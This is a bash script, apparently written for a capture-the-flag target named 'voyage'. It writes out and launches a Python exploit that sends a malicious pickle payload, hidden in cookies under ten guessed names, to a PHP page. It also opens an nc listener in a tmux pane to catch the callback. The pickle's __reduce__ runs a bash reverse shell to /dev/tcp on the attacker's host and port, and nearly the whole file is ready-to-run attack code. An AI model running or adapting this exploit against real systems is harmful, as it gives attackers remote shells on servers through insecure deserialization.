#!/usr/bin/env bash
set -euo pipefail

# Usage:
#   ./launch_dual_tmux.sh [TARGET_IP] [ATTACKER_IP] [PORT] [URL_PATH]
# Example:
#   ./launch_dual_tmux.sh 10.82.166.188 10.82.123.142 4444 /index.php

TARGET_IP="${1:-10.82.166.188}"
ATTACKER_IP="${2:-$(hostname -I | awk '{print $1}')}"
PORT="${3:-4444}"
URL_PATH="${4:-/index.php}"
SESSION_NAME="voyage"

if ! command -v tmux >/dev/null 2>&1; then
  echo "[!] tmux not found. Install first: sudo apt update ; sudo apt install -y tmux"
  exit 1
fi

if ! command -v python3 >/dev/null 2>&1; then
  echo "[!] python3 not found on this machine."
  exit 1
fi

cat > /tmp/voyage_tmux_exploit.py <<'PY'
#!/usr/bin/env python3
import os
import pickle
import binascii
import requests
import time
import sys

if len(sys.argv) != 5:
    print("Usage: python3 /tmp/voyage_tmux_exploit.py <target_ip> <attacker_ip> <port> <url_path>")
    sys.exit(1)

target_ip, attacker_ip, port, url_path = sys.argv[1], sys.argv[2], int(sys.argv[3]), sys.argv[4]
base = f"http://{target_ip}"
trigger = base + url_path

class R:
    def __reduce__(self):
        cmd = f'bash -c "bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1"'
        return os.system, (cmd,)

payload = binascii.hexlify(pickle.dumps({"user": R(), "revenue": "999999"}, protocol=4)).decode()
cookie_names = ["userData", "user_data", "user", "session", "PHPSESSID", "auth", "profile", "prefs", "data", "remember"]

print(f"[*] Target: {base}")
print(f"[*] Trigger URL: {trigger}")
print(f"[*] Callback: {attacker_ip}:{port}")
print("[*] Sending payloads...\n")

for c in cookie_names:
    try:
        s = requests.Session()
        s.cookies.set(c, payload)
        r = s.get(trigger, timeout=10)
        print(f"[+] {c:10} -> HTTP {r.status_code}")
        time.sleep(0.3)
    except Exception as e:
        print(f"[-] {c:10} -> {e}")

try:
    r = requests.get(trigger, headers={"Cookie": f"userData={payload}"}, timeout=10)
    print(f"[+] raw header -> HTTP {r.status_code}")
except Exception as e:
    print(f"[-] raw header -> {e}")

print("\n[*] Exploit round done. Keep listener open and retry if needed.")
PY

chmod +x /tmp/voyage_tmux_exploit.py

# Restart session if it already exists
if tmux has-session -t "$SESSION_NAME" 2>/dev/null; then
  tmux kill-session -t "$SESSION_NAME"
fi

# Left pane: listener
LISTENER_CMD="rlwrap nc -lvnp ${PORT}"

# Right pane: exploit sender + keep shell open
EXPLOIT_CMD="python3 /tmp/voyage_tmux_exploit.py ${TARGET_IP} ${ATTACKER_IP} ${PORT} ${URL_PATH}; echo; echo '[*] You can rerun exploit in this pane:'; echo 'python3 /tmp/voyage_tmux_exploit.py ${TARGET_IP} ${ATTACKER_IP} ${PORT} ${URL_PATH}'; exec bash"

tmux new-session -d -s "$SESSION_NAME" "$LISTENER_CMD"
tmux split-window -h -t "$SESSION_NAME" "$EXPLOIT_CMD"
tmux select-layout -t "$SESSION_NAME" even-horizontal

echo "[+] tmux session '${SESSION_NAME}' started"
echo "    Left pane : listener (nc -lvnp ${PORT})"
echo "    Right pane: exploit sender"
echo "[+] Attach with: tmux attach -t ${SESSION_NAME}"

tmux attach -t "$SESSION_NAME"
